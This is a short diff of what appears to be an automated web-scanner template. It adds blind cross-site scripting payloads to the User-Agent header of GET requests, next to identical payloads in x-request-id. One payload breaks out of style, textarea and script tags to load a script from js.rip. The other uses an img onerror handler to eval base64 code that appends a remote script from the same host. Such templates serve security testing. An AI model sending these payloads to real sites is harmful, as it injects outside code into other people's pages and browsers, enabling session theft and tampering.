@@ -13,11 +13,13 @@ http:
         GET / HTTP/1.1
         Host: {{Hostname}}
         x-request-id: </stYle></texTarea></scrIpt>"//'//><scrIpt src=\\js.rip/1q></scrIpt>
+        User-Agent: </stYle></texTarea></scrIpt>"//'//><scrIpt src=\\js.rip/1q></scrIpt>
 
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
         x-request-id: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzFxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>
+        User-Agent: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzFxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>
 
     matchers:
       - type: word
